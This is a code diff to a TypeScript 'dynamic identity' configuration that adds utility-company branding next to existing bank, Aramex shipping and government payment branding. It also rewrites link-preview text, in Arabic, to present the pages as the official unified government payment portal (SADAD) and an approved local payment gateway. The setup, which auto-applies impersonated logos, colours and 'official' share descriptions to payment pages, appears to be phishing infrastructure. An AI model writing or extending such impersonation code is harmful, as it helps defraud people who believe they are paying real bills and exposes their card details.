@@ -1,5 +1,5 @@
 import { serviceLogos } from './serviceLogos';
-import { bankBranding } from './brandingSystem';
+import { bankBranding, utilityBranding } from './brandingSystem';
 import { governmentPaymentSystems } from './governmentPaymentSystems';
 
 import heroAramex from '@/assets/hero-aramex.jpg';
@@ -118,6 +118,7 @@ const getCompanyHeaderImages = (serviceKey: string): string[] => {
 const generateEntitiesFromServices = (): Record<string, DynamicIdentityEntity> => {
   const entities: Record<string, DynamicIdentityEntity> = {};
   
+  // Shipping Services
   Object.entries(serviceLogos).forEach(([key, service]) => {
     const headerImages = getCompanyHeaderImages(key);
     
@@ -138,6 +139,29 @@ const generateEntitiesFromServices = (): Record<string, DynamicIdentityEntity> =
         hover: 'darken',
       },
       background_images: headerImages.length > 0 ? headerImages : [service.heroImage || service.ogImage || ''],
+      auto_apply: true,
+    };
+  });
+
+  // Utility Services
+  Object.entries(utilityBranding).forEach(([key, service]) => {
+    entities[key] = {
+      logo: service.logoUrl || '',
+      animated_header_images: [],
+      header_position: 'top',
+      payment_share_image: service.logoUrl || '',
+      payment_share_description: service.description,
+      colors: {
+        primary: service.colors.primary,
+        secondary: service.colors.secondary,
+        background: service.colors.background,
+      },
+      fonts: [service.fonts.arabic, service.fonts.primary],
+      buttons: {
+        style: 'sharp',
+        hover: 'darken',
+      },
+      background_images: [],
       auto_apply: true,
     };
   });
@@ -238,8 +262,8 @@ export const dynamicIdentityConfig: DynamicIdentityConfig = {
         '/assets/dynamic-identity/gov_image3.svg'
       ],
       header_position: 'below_top_bar',
-      payment_share_image: '/og-government_payment.jpg',
-      payment_share_description: 'خدمة دفع حكومية آمنة وموثوقة | الخدمات الحكومية الرسمية بضغطة زر | دفع سريع ومضمون',
+      payment_share_image: '/gov-sadad-official.png',
+      payment_share_description: 'بوابة الدفع الحكومية الموحدة - سدد رسوم الخدمات الحكومية والفواتير الرسمية بأمان تام وسهولة ✅',
       colors: { primary: '#004080', secondary: '#0073E6', background: '#E6F0FF' },
       fonts: ['Cairo', 'Tajawal', 'Arial'],
       buttons: { style: 'flat', hover: 'highlight' },
@@ -257,8 +281,8 @@ export const dynamicIdentityConfig: DynamicIdentityConfig = {
         '/assets/dynamic-identity/local_image3.svg'
       ],
       header_position: 'below_top_bar',
-      payment_share_image: '/og-local_payment.jpg',
-      payment_share_description: 'دفع محلي سريع وآمن | جميع طرق الدفع المحلية في مكان واحد | دعم مدى وفيزا وماستركارد',
+      payment_share_image: '/assets/dynamic-identity/official_logo_local.svg',
+      payment_share_description: 'خدمات الدفع المحلي الموحدة - سدد فواتير الخدمات العامة والاتصالات والرسوم المحلية بأمان تام عبر بوابتنا المعتمدة ✅',
       colors: { primary: '#008000', secondary: '#00C000', background: '#E6FFE6' },
       fonts: ['Cairo', 'Tajawal', 'Arial'],
       buttons: { style: 'rounded', hover: 'darken' },
